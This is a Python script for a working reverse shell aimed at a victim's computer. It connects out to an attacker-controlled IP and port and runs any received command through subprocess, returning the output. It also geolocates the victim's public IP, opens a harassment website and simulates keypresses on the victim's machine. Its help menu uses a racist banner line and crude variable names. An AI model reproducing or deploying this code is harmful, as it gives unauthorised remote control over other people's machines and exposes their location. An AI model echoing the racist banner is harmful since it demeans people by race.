import socket
import subprocess
import os
import requests
import json
import webbrowser
import time
import pyautogui
class reverse_shell:
       def __init__(self):
              self.protocol = 'utf-8'
              self.sock = socket.socket(socket.AF_INET)
              self.attacker_ip  = '0.0.0.0'
              self.size = 1024
              self.port = 5555
       def mainn(self):
              self.sock.connect((self.attacker_ip,self.port))
              self.sock.send(bytes('\ntype help to see the things u can do',self.protocol))
              while True:
                     
                     currentdir = os.getcwd()
                     sexx = f'\n{currentdir}:'
                     self.sock.send(bytes(sexx,self.protocol))
                     self.cmd  = self.sock.recv(self.size).decode(self.protocol)
                     self.cmd_lis = self.cmd.split()
                     if len(self.cmd_lis) > 0:
                            if self.cmd_lis[0] == 'cd':
                                   self.cd()
                            elif 'getip' in self.cmd_lis:
                                   self.iplocate()
                            elif self.cmd_lis[0] == 'trol':
                                   self.trol()
                            elif 'help' in self.cmd_lis:
                                   self.sock.send(bytes('\n------------------------------------SAX--------------------------------------------------------------\n',self.protocol))
                                   self.sock.send(bytes('\n[getip]get victims ipadress\n',self.protocol))
                                   self.sock.send(bytes('\n[trol] open the annoying site on the victims machine (which is really annoying btw)\n',self.protocol))
                                   self.sock.send(bytes('\n----------------------------------------BLACK PEOPLE-----------------------------------------------------------\n',self.protocol))
                            elif 'getinfo' in self.cmd_lis:
                                   self.getinfo()
                            else:
                                   self.run_cmd()
       def cd(self):
              try:
                     os.chdir(self.cmd_lis[1])
              except:
                     self.sock.send(bytes('failed to change dirictry',self.protocol))
       


       def iplocate(self):
              self.sock.send(bytes('\nmay take a few secs\n','utf-8'))
              response = requests.get('https://api.ipify.org?format=json')
              pp = json.loads(response.content)
              ss = dict(pp)
              
              self.sock.send(bytes (str(ss),'utf-8'))
              self.sock.send(bytes('\ndo u want to ip look up this(not 100 percent accurate)y/n:','utf-8'))
              ask = self.sock.recv(1024).decode('utf-8').split()
              if ask[0] == 'y':
                     ip_lookup_results = requests.get('http://ip-api.com/json/',ss['ip'])
                     decryptt = json.loads(ip_lookup_results.content)
                     sex = dict(decryptt)
                     self.sock.send(bytes('----------------------------',self.protocol))
                     for key,result in sex.items():
                            ppp =f'{key} - {result}\n'
                            self.sock.send(bytes(ppp,'utf-8'))
                     self.sock.send(bytes('----------------------------',self.protocol))

       def run_cmd(self):
              output = subprocess.getoutput(self.cmd)
              self.sock.send(bytes(output,self.protocol))
       

    
       def trol(self):
              self.sock.send(bytes('\nTROL TROL TROL TROL',self.protocol)) 
              self.sock.send(bytes('\n1) open da annoying site (its really annoying btw)',self.protocol)) 
              self.sock.send(bytes('\nTROL TROL TROL TROL',self.protocol)) 
              webbrowser.open('https://theannoyingsite.com/',new=2)
              time.sleep(1)
              self.sock.send(bytes('please wait a sec',self.protocol))
              while True:     
                     pyautogui.press('Space')
                     time.sleep(4)
                     break


              self.sock.send(bytes('\ncode ran successfully',self.protocol))
       
o = reverse_shell()
o.mainn()
